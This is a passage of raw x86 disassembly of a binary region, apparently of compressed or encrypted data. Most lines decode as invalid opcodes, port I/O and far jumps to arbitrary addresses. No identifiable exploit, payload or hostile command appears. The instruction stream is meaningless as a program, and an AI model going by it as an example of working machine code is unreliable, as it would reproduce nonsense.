  53326f:	int    0x71
  533271:	in     eax,0xcb
  533273:	xchg   ebx,eax
  533274:	(bad)  
  533275:	arpl   WORD PTR [esi],di
  533277:	out    0x99,eax
  533279:	push   ebx
  53327a:	pop    edx
  53327b:	int    0xb7
  53327d:	pop    eax
  53327e:	jno    0x53328b
  533280:	arpl   WORD PTR [ecx+0x45ce5976],di
  533286:	push   ss
  533287:	shr    DWORD PTR [ecx-0x5816e8a6],cl
  53328d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53328e:	dec    ebp
  53328f:	jbe    0x5332a6
  533291:	xchg   ecx,eax
  533292:	pop    ds
  533293:	jle    0x533246
  533295:	jecxz  0x53327f
  533297:	mov    DWORD PTR [edi+0x21858ac],edi
  53329d:	xchg   ebx,eax
  53329e:	ja     0x5332fd
  5332a0:	pop    ebp
  5332a1:	cli    
  5332a2:	cdq    
  5332a3:	fldcw  WORD PTR [eax]
  5332a5:	das    
  5332a6:	cmp    al,0xb6
  5332a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5332a9:	pop    eax
  5332aa:	fwait
  5332ab:	mov    ebx,0x44f4a7f5
  5332b0:	push   ebx
  5332b1:	scas   eax,DWORD PTR es:[edi]
  5332b2:	push   edx
  5332b3:	int3   
  5332b4:	fwait
  5332b5:	sbb    dl,BYTE PTR [ecx]
  5332b7:	push   es
  5332b8:	int3   
  5332b9:	fmul   QWORD PTR [edx+ecx*2-0x78]
  5332bd:	xchg   edi,eax
  5332be:	adc    BYTE PTR [edx],0x95
  5332c1:	push   ss
  5332c2:	xor    al,0x62
  5332c4:	dec    esi
  5332c5:	xchg   edx,eax
  5332c6:	retf   0xa70a
  5332c9:	int    0x2e
  5332cb:	sub    BYTE PTR [edi],ah
  5332cd:	dec    esp
  5332ce:	push   ss
  5332cf:	inc    ecx
  5332d0:	into   
  5332d1:	sub    edi,DWORD PTR [eax+0x5]
  5332d4:	adc    ecx,eax
  5332d6:	dec    ecx
  5332d7:	pusha  
  5332d8:	out    dx,eax
  5332d9:	fwait
  5332da:	xchg   DWORD PTR [edx+0x6aeea513],edx
  5332e0:	mov    ebp,0x7cbec0c0
  5332e5:	in     al,dx
  5332e6:	dec    ebp
  5332e7:	xor    al,0x82
  5332e9:	call   0x30ed24e9
  5332ee:	scas   al,BYTE PTR es:[edi]
  5332ef:	sahf   
  5332f0:	mov    al,ds:0xac2a8ec0
  5332f5:	sti    
  5332f6:	mov    esp,0x95900619
  5332fb:	add    eax,0x7d4f7ac5
  533300:	icebp  
  533301:	xchg   ebp,eax
  533302:	retf   0x2e4e
  533305:	icebp  
  533306:	pop    esp
  533307:	cmp    BYTE PTR [ecx],ch
  533309:	push   esp
  53330a:	inc    esi
  53330b:	or     BYTE PTR [ecx+0x16e6a3a4],0xe5
  533312:	sub    ebp,DWORD PTR [esi-0x65]
  533315:	out    dx,eax
  533316:	cdq    
  533317:	sbb    eax,0xb92792f4
  53331c:	mov    ebx,DWORD PTR [eax+0x38033fd8]
  533322:	pop    edi
  533323:	xchg   edi,eax
  533324:	inc    esi
  533325:	mov    ebx,0x9581d35e
  53332a:	lar    ebx,si
  53332d:	inc    edi
  53332e:	inc    ebx
  53332f:	push   ebp
  533330:	pop    ecx
  533331:	push   esi
  533332:	sbb    DWORD PTR ds:[ebp+0x283f5cc8],ebp
  533339:	and    bh,BYTE PTR [ebx-0x64]
  53333c:	jbe    0x533392
  53333e:	call   FWORD PTR [ebp+0x713a6e64]
  533344:	jae    0x53337a
  533346:	mov    ah,0x6a
  533348:	sbb    BYTE PTR ss:[esi+ebx*4],dh
  53334c:	and    al,BYTE PTR [edi+0x4626ff34]
  533352:	and    al,0xe9
  533354:	xor    BYTE PTR [edx+0x3e2d7303],0xd9
  53335b:	mov    DWORD PTR [edx],ecx
  53335d:	xchg   ecx,eax
  53335e:	cmp    dl,al
  533360:	in     eax,dx
  533361:	jmp    0x533322
  533363:	xchg   edi,eax
  533364:	adc    edi,DWORD PTR [ecx-0x7c51d37f]
  53336a:	or     DWORD PTR [esi],ebp
  53336c:	arpl   WORD PTR [eax],cx
  53336e:	mov    bl,bl
  533370:	lahf   
  533371:	mov    edi,DWORD PTR [ecx]
  533373:	stos   BYTE PTR es:[edi],al
  533374:	fdiv   DWORD PTR [esi-0x6b]
  533377:	daa    
  533378:	es ja  0x5333f5
  53337b:	mov    bh,0xa4
  53337d:	js     0x53331d
  53337f:	xchg   ecx,eax
  533380:	mov    ah,0x32
  533382:	cli    
  533383:	jmp    0xb56:0x9eaf0a26
  53338a:	fmul   st(1),st
  53338c:	mov    al,0x4e
  53338e:	aad    0xe8
  533390:	dec    BYTE PTR [eax+0x6b946944]
  533396:	(bad)  
  533397:	fiadd  DWORD PTR [edi]
  533399:	mov    edi,ebp
  53339b:	(bad)  
  53339c:	bound  esp,QWORD PTR [esi]
  53339e:	xchg   ebp,eax
  53339f:	in     al,0xf
  5333a1:	mov    bh,0xfb
  5333a3:	fisttp WORD PTR [ebx+eax*1+0x8101de8]
  5333aa:	pop    ebx
  5333ab:	scas   al,BYTE PTR es:[edi]
  5333ac:	xor    DWORD PTR [edx+0x25687d87],edi
  5333b2:	xor    ch,BYTE PTR [ecx+0x41]
  5333b5:	and    eax,ebx
  5333b7:	adc    edx,DWORD PTR [edx+0x1a]
  5333ba:	inc    esi
  5333bb:	jecxz  0x5333ab
  5333bd:	push   0xd9b8400
  5333c2:	(bad)  
  5333c3:	loopne 0x53335a
  5333c5:	in     al,dx
  5333c6:	add    bh,ch
  5333c8:	xchg   edi,eax
  5333c9:	pop    edi
  5333ca:	fsubr  QWORD PTR [ebx+0x30]
  5333cd:	mov    eax,0x10d4543a
  5333d2:	popa   
  5333d3:	push   ss
  5333d4:	stc    
  5333d5:	inc    esp
  5333d6:	or     DWORD PTR [ecx+esi*4],edi
  5333d9:	pop    ecx
  5333da:	inc    ebp
  5333db:	xchg   edx,eax
  5333dc:	xchg   ebp,eax
  5333dd:	and    eax,0x4bb690eb
  5333e2:	xor    al,0x84
  5333e4:	or     ecx,esi
  5333e6:	lea    ebx,[ecx+0x59]
  5333e9:	mov    esp,0xac736ce9
  5333ee:	ss neg ch
  5333f1:	cli    
  5333f2:	test   eax,0xc5a67fcb
  5333f7:	cli    
  5333f8:	or     BYTE PTR [edi+0x48fd0eb0],bl
  5333fe:	das    
  5333ff:	dec    ebx
  533400:	sti    
  533401:	xor    DWORD PTR [esi-0x54],edx
  533404:	add    al,dl
  533406:	pop    ss
  533407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  533408:	or     edx,DWORD PTR [ebx]
  53340a:	aas    
  53340b:	stos   DWORD PTR es:[edi],eax
  53340c:	or     al,0xca
  53340e:	xchg   esi,eax
  53340f:	outs   dx,BYTE PTR ds:[esi]
  533410:	stc    
  533411:	jo     0x53347d
  533413:	inc    eax
  533414:	dec    edi
  533415:	lea    ebx,[ebp-0x2fd3267f]
  53341b:	dec    edi
  53341c:	lds    esp,FWORD PTR [edx]
  53341e:	mov    esp,0x3d289733
  533423:	adc    BYTE PTR [ecx-0x32],0x32
  533427:	pop    esi
  533428:	enter  0x3427,0xca
  53342c:	mov    eax,0xebbbdee0
  533431:	scas   al,BYTE PTR es:[edi]
  533432:	ror    bh,1
  533434:	jmp    0x3008:0xa669d0df
  53343b:	sub    eax,0xdcb9b9a9
  533440:	jbe    0x533431
  533442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533443:	mov    ecx,0x358129f
  533448:	fs add eax,0xa01fd5ab
  53344e:	out    0x96,al
  533450:	lock push ds
  533452:	sbb    edi,esi
  533454:	ds scas al,BYTE PTR es:[edi]
  533456:	inc    esp
  533457:	call   0x15ad873e
  53345c:	xchg   esp,eax
  53345d:	mov    ecx,0x1b446b15
  533462:	sahf   
  533463:	mov    cl,0xec
  533465:	jnp    0x5334b4
  533467:	dec    ecx
  533468:	mov    eax,ds:0xc357846d
  53346d:	xchg   esp,eax
  53346e:	and    DWORD PTR [ecx-0x3f],edi
  533471:	fdivr  QWORD PTR [esi]
  533473:	loopne 0x53348a
  533475:	not    DWORD PTR ds:0xe2a0b63a
  53347b:	mov    ebp,0x24f66ba4
  533480:	mov    edi,0x89c730ea
  533485:	ja     0x53340d
  533487:	popf   
  533488:	scas   eax,DWORD PTR es:[edi]
  533489:	cmp    al,0x5e
  53348b:	out    0x2e,al
  53348d:	sbb    ah,BYTE PTR [esp+ebp*4]
  533490:	push   eax
  533491:	test   al,0x84
  533493:	or     al,al
  533495:	or     BYTE PTR [edi+0x46e57eee],cl
  53349b:	mov    DWORD PTR [ebx],ebx
  53349d:	mov    edi,esi
  53349f:	shl    BYTE PTR [eax],cl
  5334a1:	cdq    
  5334a2:	(bad)  
  5334a4:	adc    al,0xae
  5334a6:	xor    eax,0x15c8bd65
  5334ab:	mov    bl,0xe8
  5334ad:	add    bl,cl
  5334af:	push   edi
  5334b0:	ins    DWORD PTR es:[edi],dx
  5334b1:	fnsave [esi]
  5334b3:	add    esp,0x8ad1fdb
  5334b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5334ba:	hlt    
  5334bb:	mov    edx,0x8125de36
  5334c0:	test   BYTE PTR [edi],0xc0
  5334c3:	and    DWORD PTR [esi-0x4f],ebp
  5334c6:	xchg   ebp,eax
  5334c7:	jne    0x53344e
  5334c9:	inc    edx
  5334ca:	iret   
  5334cb:	outs   dx,BYTE PTR ds:[esi]
  5334cc:	and    al,0x35
  5334ce:	dec    esi
  5334cf:	push   ebp
  5334d0:	iret   
  5334d1:	push   ebx
  5334d2:	pop    esi
  5334d3:	stos   BYTE PTR es:[edi],al
  5334d4:	sbb    cl,cl
  5334d6:	fdivp  st(4),st
  5334d8:	fstp   QWORD PTR [edi]
  5334da:	sub    DWORD PTR [eax],ebp
  5334dc:	sbb    DWORD PTR [eax],esp
  5334de:	leave  
  5334df:	pop    ds
  5334e0:	pusha  
  5334e1:	jo     0x53347a
  5334e3:	xor    al,cl
  5334e5:	test   al,0x3d
  5334e7:	daa    
  5334e8:	pop    ss
  5334e9:	aaa    
  5334ea:	fcom   QWORD PTR [edi-0x50]
  5334ed:	inc    ebp
  5334ee:	ins    BYTE PTR es:[edi],dx
  5334ef:	fnsave [ebp+0x3abe8ffc]
  5334f5:	lods   eax,DWORD PTR ds:[esi]
  5334f6:	push   ebx
  5334f7:	mov    ch,0x24
  5334f9:	xlat   BYTE PTR ds:[ebx]
  5334fa:	mov    WORD PTR [edx+0x57ee1797],?
  533500:	aaa    
  533501:	scas   eax,DWORD PTR es:[edi]
  533502:	and    ebp,ebp
  533504:	add    ecx,eax
  533506:	in     al,0xe7
  533508:	div    BYTE PTR [ebp-0x3]
  53350b:	cwde   
  53350c:	sub    al,0xcb
  53350e:	cs ret 0x36d
  533512:	jmp    0x6e47:0x556a0291
  533519:	lods   eax,DWORD PTR ds:[esi]
  53351a:	test   esp,esp
  53351c:	pop    esp
  53351d:	fsub   DWORD PTR [ebx-0x735ea427]
  533523:	sahf   
  533524:	ret    
  533525:	xor    BYTE PTR [eax],0x21
  533528:	mov    ds,WORD PTR [esp+eiz*4]
  53352b:	jo     0x5334fa
  53352d:	inc    ecx
  53352e:	test   dh,ah
  533530:	dec    edi
  533531:	jge    0x533591
  533533:	(bad)  
  533535:	scas   al,BYTE PTR es:[edi]
  533536:	test   al,0xde
  533538:	cmp    BYTE PTR [edx-0x3d2df598],dh
  53353e:	xor    ebx,DWORD PTR [edi-0xb9ba3aa]
  533544:	es dec esp
  533546:	sbb    al,BYTE PTR [ebp-0x71]
  533549:	call   0x974:0x61a78615
  533550:	js     0x533564
  533552:	push   esi
  533553:	out    0x55,al
  533555:	push   ebx
  533556:	pop    ebp
  533557:	or     ecx,DWORD PTR [ecx-0x7cc10256]
  53355d:	sbb    eax,0x94a6b5fd
  533562:	test   BYTE PTR [esi-0x52bfb2ce],0x9c
  533569:	sar    DWORD PTR [eax],0x42
  53356c:	or     al,0xc9
  53356e:	imul   BYTE PTR [edx-0x7c]
  533571:	sbb    eax,0xd89358a
  533576:	mov    dl,0x74
  533578:	push   ds
  533579:	mov    ds:0x51d947fb,al
  53357e:	mov    dh,0xdc
  533580:	and    DWORD PTR [esi],ebp
  533582:	rol    BYTE PTR [edi-0x7e],cl
  533585:	dec    ecx
  533586:	inc    eax
  533587:	ficom  WORD PTR [esi]
  533589:	mov    WORD PTR [esi+0xc],fs
  53358c:	inc    esp
  53358d:	ror    bl,1
  53358f:	push   edx
  533590:	sbb    esp,esi
  533592:	jmp    0x5335dd
  533594:	cld    
  533595:	cmp    al,0xb8
  533597:	dec    ecx
  533598:	test   al,0x67
  53359a:	xchg   ebp,eax
  53359b:	aaa    
  53359c:	dec    esi
  53359d:	sub    BYTE PTR [ebx],ah
  53359f:	mov    edx,0xdba22ab5
  5335a4:	jl     0x5335c3
  5335a6:	and    DWORD PTR [bx+si],eax
  5335a9:	loop   0x533546
  5335ab:	xlat   BYTE PTR ds:[ebx]
  5335ac:	jp     0x5335a2
  5335ae:	into   
  5335af:	mov    ebx,0x4eaf8a34
  5335b4:	and    edi,esi
  5335b6:	mov    ds:0x947a400,al
  5335bb:	push   ecx
  5335bc:	sub    ebx,DWORD PTR [edi+0x5e0bbffc]
  5335c2:	daa    
  5335c3:	bound  ebx,QWORD PTR [eax]
  5335c5:	mov    ebp,0xe852b252
  5335ca:	xor    ah,cl
  5335cc:	cli    
  5335cd:	std    
  5335ce:	mov    BYTE PTR [edx+0x793d309e],al
  5335d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5335d5:	sti    
  5335d6:	pop    ebp
  5335d7:	dec    ebp
  5335d8:	sub    al,0x48
  5335da:	mov    edi,0xc47b5de8
  5335df:	call   0x754e:0xb9ca946
  5335e6:	stc    
  5335e7:	xchg   esi,eax
  5335e8:	pop    ds
  5335e9:	cs push esi
  5335eb:	mov    dl,0x42
  5335ed:	or     al,0x9
  5335ef:	popa   
  5335f0:	cmp    esi,DWORD PTR [ebx]
  5335f2:	ror    BYTE PTR [ebx],1
  5335f4:	pop    esp
  5335f5:	fnsave [edx]
  5335f7:	in     al,dx
  5335f8:	sub    DWORD PTR [edx-0x1286d9bd],0xffffffb7
  5335ff:	and    eax,0xa26baf54
  533604:	cmp    bl,BYTE PTR [edx-0x3e15e4a5]
  53360a:	les    edi,FWORD PTR [edx-0x7e]
  53360d:	add    al,0xec
  53360f:	xchg   ch,ch
  533611:	cmp    bl,ah
  533613:	outs   dx,BYTE PTR ds:[esi]
  533614:	(bad)  
  533615:	(bad)  
  533616:	in     al,dx
  533617:	push   es
  533618:	ins    DWORD PTR es:[edi],dx
  533619:	(bad)  
  53361a:	stos   DWORD PTR es:[edi],eax
  53361b:	mov    WORD PTR [edx+0x5d],ss
  53361e:	stc    
  53361f:	dec    esp
  533620:	fcmovnbe st,st(2)
  533622:	fistp  QWORD PTR [eax]
  533624:	retf   
  533625:	jg     0x533675
  533627:	add    al,0x53
  533629:	sbb    DWORD PTR [edx+0x5b7f96be],edi
  53362f:	clc    
  533630:	adc    DWORD PTR [eax+0x3c],0xffffffb5
  533634:	or     eax,0x50775ddf
  533639:	stos   DWORD PTR es:[edi],eax
  53363a:	add    BYTE PTR [ecx],dh
  53363c:	sti    
  53363d:	loop   0x533629
  53363f:	bound  edi,QWORD PTR [eax-0x24ba145a]
  533645:	test   al,0xf
  533647:	aaa    
  533648:	push   edi
  533649:	icebp  
  53364a:	dec    eax
  53364b:	cmp    BYTE PTR ds:0x95aef6c3,bh
  533651:	into   
  533652:	mov    al,0xb4
  533654:	sub    DWORD PTR [eax+0x52f8c181],ebx
  53365a:	and    al,0x6a
  53365c:	mov    dh,0x95
  53365e:	adc    DWORD PTR [eax+0x5c],eax
  533661:	or     BYTE PTR [eax+0x7f],ah
  533664:	les    ecx,FWORD PTR [eax-0x68de8ea7]
  53366a:	outs   dx,DWORD PTR ds:[esi]
  53366b:	retf   
  53366c:	loopne 0x53369a
  53366e:	mov    eax,0x53c0c42b
  533673:	jp     0x533685
  533675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  533676:	adc    bl,0xce
  533679:	arpl   WORD PTR [esi-0x1fec6cf1],si
  53367f:	jp     0x533671
  533681:	adc    esi,DWORD PTR [edx-0x1690ab9a]
  533687:	mov    ds:0x8709597,eax
  53368c:	adc    dl,al
  53368e:	jmp    0xc12d:0xd1a4ed96
  533695:	idiv   DWORD PTR [esi+0x46fcd583]
  53369b:	daa    
  53369c:	pop    esi
  53369d:	cmp    al,0x4
  53369f:	jno    0x6a493b37
  5336a5:	mov    esi,0x99c283a3
  5336aa:	dec    ecx
  5336ab:	adc    ecx,DWORD PTR [esi]
  5336ad:	mov    al,ds:0xeb3ad6b
  5336b2:	pop    esp
  5336b3:	fldcw  WORD PTR [ebp+0x12]
  5336b6:	inc    esp
  5336b7:	icebp  
  5336b8:	mul    ebx
  5336ba:	in     eax,0xa1
  5336bc:	push   ds
  5336bd:	dec    esi
  5336be:	jp     0x533643
  5336c0:	add    ch,BYTE PTR [ebp-0x1334fd55]
  5336c6:	pop    ebx
  5336c7:	int3   
  5336c8:	mov    ecx,0x37d714db
  5336cd:	popa   
  5336ce:	shl    ch,cl
  5336d0:	or     DWORD PTR [ebx],ecx
  5336d2:	jmp    0x7526:0x9fe5587a
  5336d9:	loope  0x5336fc
  5336db:	pop    esi
  5336dc:	mov    cl,0x2c
  5336de:	add    BYTE PTR [eax-0x6d],cl
  5336e1:	pop    esi
  5336e2:	std    
  5336e3:	add    bh,ah
  5336e5:	sub    DWORD PTR [ebx+0x35],esp
  5336e8:	outs   dx,DWORD PTR ds:[esi]
  5336e9:	jle    0x53367e
  5336eb:	popa   
  5336ec:	pop    edx
  5336ed:	pop    esi
  5336ee:	xor    ebp,DWORD PTR [esi-0x31d0d288]
  5336f4:	and    BYTE PTR [ebx],dh
  5336f6:	loope  0x533718
  5336f8:	rol    DWORD PTR [edx+0x2e],cl
  5336fb:	fnsave [edi-0x7c]
  5336fe:	push   es
  5336ff:	stos   DWORD PTR es:[edi],eax
  533700:	(bad)  
  533701:	sub    dl,cl
  533703:	dec    edx
  533704:	push   ebx
  533705:	ret    
  533706:	push   edi
  533707:	mov    al,0x6b
  533709:	stc    
  53370a:	scas   al,BYTE PTR es:[edi]
  53370b:	in     eax,0x15
  53370d:	rol    DWORD PTR [eax+0x78],1
  533710:	pop    ds
  533711:	pop    es
  533712:	aad    0x80
  533714:	xchg   ebp,eax
  533715:	fsubr  QWORD PTR [edi+0x7017ace9]
  53371b:	pop    edi
  53371c:	mov    esp,0x2d237d9c
  533721:	test   DWORD PTR [ebp-0x10896e0f],edx
  533727:	(bad)  
  533728:	or     al,0xba
  53372a:	mov    al,0x67
  53372c:	xor    BYTE PTR [edi-0x20],cl
  53372f:	(bad)  
  533730:	push   edi
  533731:	jmp    0xa9dacbe1
  533736:	sbb    esp,DWORD PTR [ecx+0x574ca6e9]
  53373c:	mov    edx,0xaf630c60
  533741:	daa    
  533742:	cld    
  533743:	push   ss
  533744:	jb     0x533785
  533746:	rol    bl,0x50
  533749:	lock xchg esp,eax
  53374b:	fbld   TBYTE PTR [ecx]
  53374d:	and    al,0x90
  53374f:	mov    al,0x2c
  533751:	push   eax
  533752:	jnp    0x533763
  533754:	jbe    0x5337a9
  533756:	sbb    DWORD PTR [edx+0x73],ebx
  533759:	push   ds
  53375a:	inc    esi
  53375b:	push   0xffffff82
  53375d:	fild   QWORD PTR [eax]
  53375f:	fisubr WORD PTR [ebp+0x6d50dd1c]
  533765:	pop    ebp
  533766:	mov    dh,BYTE PTR [ecx+0x44]
  533769:	sub    al,0xbf
  53376b:	pop    eax
  53376c:	std    
  53376d:	push   ebx
  53376e:	lahf   
  53376f:	dec    eax
  533770:	jae    0x5336f5
  533772:	popf   
  533773:	ret    0x3f6e
  533776:	cmp    BYTE PTR [ebx+0x3e907bb0],bl
  53377c:	push   esp
  53377d:	test   DWORD PTR [eax+0x1f4cce75],esp
  533783:	pushf  
  533784:	not    BYTE PTR [esi+0x2f2fa69a]
  53378a:	sbb    al,0x93
  53378c:	adc    eax,0x2750a1ca
  533791:	fst    DWORD PTR [edx+esi*8+0x2b83f3ee]
  533798:	clc    
  533799:	leave  
  53379a:	sub    dh,BYTE PTR [edi+0x71]
  53379d:	and    BYTE PTR [edi-0x57],0x60
  5337a1:	mov    ebp,0xf941b4d2
  5337a6:	dec    ecx
  5337a7:	xor    BYTE PTR [eax+0x6e],bh
  5337aa:	or     eax,0x326aa1bd
  5337af:	xchg   esi,eax
  5337b0:	or     BYTE PTR [esi-0x663fa218],0xe8
  5337b7:	repnz (bad) 
  5337b9:	out    dx,al
  5337ba:	inc    edi
  5337bb:	fidiv  WORD PTR [edi+0x1e1120d]
  5337c1:	jne    0x5337be
  5337c3:	adc    al,cl
  5337c5:	frstor [esi+eax*1-0x51a5ca4d]
  5337cc:	test   DWORD PTR [ebx-0x26],ebp
  5337cf:	repnz jmp 0x6322:0x77980ad9
  5337d7:	sub    eax,ebp
  5337d9:	ins    BYTE PTR es:[edi],dx
  5337da:	(bad)  
  5337db:	mov    edx,0x3ea42ac6
  5337e0:	ja     0x5337b6
  5337e2:	mov    dh,0xe5
  5337e4:	adc    al,0x42
  5337e6:	ja     0x533861
  5337e8:	sub    eax,0xd839bdb4
  5337ed:	mov    ebp,0xe8d2d1f4
  5337f2:	mov    ebx,0x94aa4474
  5337f7:	cmc    
  5337f8:	mov    dh,0x2b
  5337fa:	sbb    eax,0x7c01d16a
  5337ff:	daa    
  533800:	add    esi,DWORD PTR fs:[eax]
  533803:	test   bh,bh
  533805:	jns    0x5337d0
  533807:	dec    ecx
  533808:	adc    DWORD PTR [edi+0x79],edx
  53380b:	dec    eax
  53380c:	add    esi,DWORD PTR [ecx-0x7fa005f4]
  533812:	cld    
  533813:	js     0x5337f4
  533815:	aam    0xf4
  533817:	packssdw mm6,QWORD PTR [bx+di+0x2219]
  53381d:	fwait
  53381e:	xor    edi,edi
  533820:	sbb    ebx,DWORD PTR [edx]
  533822:	clc    
  533823:	test   BYTE PTR [eax],dh
  533825:	sbb    DWORD PTR [edi+0x6c0cbd10],ebp
  53382b:	xchg   edx,eax
  53382c:	xchg   DWORD PTR [edi+eax*4+0x66],esi
  533830:	rcl    DWORD PTR [esi-0x4f],cl
  533833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533834:	jne    0x533884
  533836:	push   edx
  533837:	jo     0x533808
  533839:	cdq    
  53383a:	aad    0xe8
  53383c:	jmp    DWORD PTR [edx+edi*4-0x12]
  533840:	bnd ret 0x41ad
  533844:	fsubr  DWORD PTR [eax+0x5100c02b]
  53384a:	push   0x940d395a
  53384f:	es popa 
  533851:	lock mov cs,WORD PTR [edx+ebx*2-0x2ad5bd1a]
  533859:	sub    DWORD PTR [ebx-0x735f06aa],esp
  53385f:	dec    esi
  533860:	mov    ebp,0x60bb6e1a
  533865:	cmp    DWORD PTR [esi+0x42],eax
  533868:	data16 mov dh,0x2
  53386b:	and    al,0xcd
  53386d:	shr    esp,0x7c
  533870:	jp     0x53385c
  533872:	cli    
  533873:	or     BYTE PTR [edx+ecx*1-0x1e],dl
  533877:	out    0x3b,al
  533879:	mov    ebp,0xb1caa78e
  53387e:	loope  0x533876
  533880:	cli    
  533881:	xchg   ebp,eax
  533882:	push   eax
  533883:	clc    
  533884:	das    
  533885:	inc    esi
  533886:	test   al,0xd9
  533888:	cmc    
  533889:	ds in  eax,0xfc
  53388c:	rcl    ebx,cl
  53388e:	outs   dx,BYTE PTR ds:[esi]
  53388f:	pop    edx
  533890:	sti    
  533891:	adc    al,0xf3
  533893:	cmp    al,0x3
  533895:	and    edx,DWORD PTR [ecx]
  533897:	fnstsw WORD PTR [ecx+edx*8-0x517ce463]
  53389e:	fcmovu st,st(1)
  5338a0:	imul   DWORD PTR ds:0x80eaa5d5
  5338a6:	popa   
  5338a7:	aad    0x5d
  5338a9:	sar    ecx,0x6b
  5338ac:	xor    eax,0x3861d7ee
  5338b1:	cmp    DWORD PTR [esi-0x10],eax
  5338b4:	cwde   
  5338b5:	sub    eax,0xbf87b815
  5338ba:	inc    esp
  5338bb:	xlat   BYTE PTR ds:[ebx]
  5338bc:	adc    DWORD PTR [ecx-0x72e64591],eax
  5338c2:	(bad)  [ecx+ebx*4-0x21f679dd]
  5338c9:	into   
  5338ca:	shr    DWORD PTR [esi],1
  5338cc:	outs   dx,DWORD PTR ds:[esi]
  5338cd:	fistp  WORD PTR [ebx+ebx*2-0x7adb72c1]
  5338d4:	push   ebx
  5338d5:	retf   0xa1fe
  5338d8:	adc    BYTE PTR [ebx+0x2369c29],ah
  5338de:	js     0x5338eb
  5338e0:	hlt    
  5338e1:	xor    al,0xcd
  5338e3:	test   BYTE PTR [eax],ch
  5338e5:	stos   DWORD PTR es:[edi],eax
  5338e6:	xor    DWORD PTR [edi+0x5547a0fe],ebp
  5338ec:	push   DWORD PTR [edx]
  5338ee:	jmp    0x4fb5:0xa93521e4
  5338f5:	(bad)  
  5338f6:	fs push esi
  5338f8:	test   dl,dh
  5338fa:	push   0x1cf4f53c
  5338ff:	sub    BYTE PTR [ebx+0x62],0x74
  533903:	sbb    eax,DWORD PTR [esi]
  533905:	lea    ecx,[ecx-0x2bdb6ff0]
  53390b:	cmc    
  53390c:	jle    0x53392b
  53390e:	es sub eax,0x6e0e11f6
  533914:	and    BYTE PTR [eax],ah
  533916:	stc    
  533917:	(bad)  
  533918:	dec    ebx
  533919:	mov    ebx,0xa8d12679
  53391e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53391f:	xchg   ebx,eax
  533920:	jnp    0x53398b
  533922:	mov    WORD PTR [ebx-0x6fe1b51d],?
  533928:	jae    0x533939
  53392a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53392b:	xchg   DWORD PTR ds:0x7357b23a,esi
  533931:	push   edx
  533932:	and    cl,BYTE PTR [ebx+eax*2-0x5a99711d]
  533939:	outs   dx,BYTE PTR ds:[esi]
  53393a:	in     al,dx
  53393b:	push   ss
  53393c:	jle    0x5338d4
  53393e:	and    esi,edi
  533940:	fadd   QWORD PTR [esi-0x5c]
  533943:	adc    BYTE PTR [ebp-0x46398819],bl
  533949:	sub    eax,0x83a90e13
  53394e:	repnz pop esi
  533950:	cmp    al,0x7b
  533952:	lods   eax,DWORD PTR ds:[esi]
  533953:	pop    esp
  533954:	jg     0x53397e
  533956:	imul   ebx,esp,0x2
  533959:	pop    ecx
  53395a:	cdq    
  53395b:	and    al,0x54
  53395d:	ins    DWORD PTR es:[edi],dx
  53395e:	daa    
  53395f:	dec    edi
  533960:	pop    eax
  533961:	pop    esp
  533962:	js     0x533969
  533964:	and    esp,DWORD PTR [eax+0x4b]
  533967:	push   edx
  533968:	add    DWORD PTR [eax+ebp*4],0xf4c6a74a
  53396f:	aam    0x32
  533971:	push   0x2a
  533973:	(bad)  
  533975:	mov    dh,0xcb
  533977:	mov    ebp,0x264957b7
  53397c:	pushf  
  53397d:	stos   BYTE PTR es:[edi],al
  53397e:	mov    ah,BYTE PTR [esi]
  533980:	and    al,0x41
  533982:	jns    0x533986
  533984:	pop    ss
  533985:	outs   dx,BYTE PTR ds:[esi]
  533986:	fucomip st,st(4)
  533988:	and    bp,bx
  53398b:	sbb    DWORD PTR [edi-0x4c],esp
  53398e:	sbb    DWORD PTR [ecx-0x2e],esp
  533991:	xor    eax,0xf4aae987
  533996:	and    eax,0x3f16652b
  53399b:	mov    al,0x8
  53399d:	push   ebp
  53399e:	leave  
  53399f:	add    bl,dl
  5339a1:	imul   ebp,esp,0x5d34bab0
  5339a7:	sbb    ah,bl
  5339a9:	dec    edi
  5339aa:	arpl   WORD PTR [ebx+0x2f8e822e],dx
  5339b0:	mov    cs,WORD PTR [edi-0x3c8d1a40]
  5339b6:	inc    edx
  5339b7:	or     al,0xbe
  5339b9:	inc    edx
  5339ba:	mov    WORD PTR [ebx+0x10],ds
  5339bd:	pop    ds
  5339be:	push   ebx
  5339bf:	dec    edi
  5339c0:	pop    eax
  5339c1:	hlt    
  5339c2:	push   ebx
  5339c3:	test   DWORD PTR [edx+0x7770cad5],ebx
  5339c9:	mov    ebx,0xe096e93e
  5339ce:	push   eax
  5339cf:	aam    0xe2
  5339d1:	inc    eax
  5339d2:	fdiv   st,st(2)
  5339d4:	int    0x76
  5339d6:	xchg   edx,eax
  5339d7:	gs bnd jmp 0xeaf18408
  5339de:	and    al,0x83
  5339e0:	out    dx,eax
  5339e1:	and    eax,0x2d95512f
  5339e6:	icebp  
  5339e7:	cmp    eax,0xd9c64f1
  5339ec:	out    dx,al
  5339ed:	adc    eax,DWORD PTR [ecx]
  5339ef:	inc    esi
  5339f0:	push   DWORD PTR [ebx-0x3f]
  5339f3:	sub    cl,BYTE PTR [ecx-0xcba1aed]
  5339f9:	in     al,dx
  5339fa:	retf   0x55cc
  5339fd:	jae    0x533a3a
  5339ff:	cdq    
  533a00:	mov    eax,0xaa478c05
  533a05:	adc    DWORD PTR [ebx+edi*1-0x6f56706],0xffffffca
  533a0d:	sub    eax,0x5c8cc22d
  533a12:	push   ebp
  533a13:	mov    dl,0xcb
  533a15:	fimul  DWORD PTR [eax]
  533a17:	inc    esp
  533a18:	sub    esi,DWORD PTR [edi+0x64fc365]
  533a1e:	cmp    dl,BYTE PTR [edx]
  533a20:	cmp    ebx,0x14
  533a23:	pop    edx
  533a24:	jg     0x533a5f
  533a26:	sub    DWORD PTR [ecx+eiz*8],edi
  533a29:	test   BYTE PTR [esi+0x24],cl
  533a2c:	mov    ecx,0xa8f774ea
  533a31:	(bad)  
